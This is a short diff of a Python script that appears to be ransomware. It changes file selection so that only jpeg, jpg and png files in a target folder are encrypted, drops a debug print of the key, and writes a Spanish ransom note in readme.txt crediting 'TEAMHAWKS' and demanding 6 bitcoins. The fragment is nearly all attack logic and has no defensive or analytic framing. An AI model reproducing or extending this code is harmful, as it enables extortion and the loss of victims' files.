@@ -39,18 +39,16 @@ def start():
             c = cargar_key()
         except:
             c = 0
-        print(c)
         return c
 
 def run():
     key = start()
 
     items = os.listdir(path_to_encrypt)
-    full_path = [path_to_encrypt + '\\' + item for item in items]
-        
+    full_path = [path_to_encrypt + '\\' + item for item in items if item.split('.')[1] in ['jpeg','jpg','png']]
+   
     encrypt(full_path, key)
 
     with open(path_to_encrypt + '\\' + 'readme.txt', 'w') as file:
         file.write('Tus archivos han sido encriptados por TEAMHAWKS\n')
         file.write('Debe enviar 6 bitcoins a la cuenta 000000000000')
-
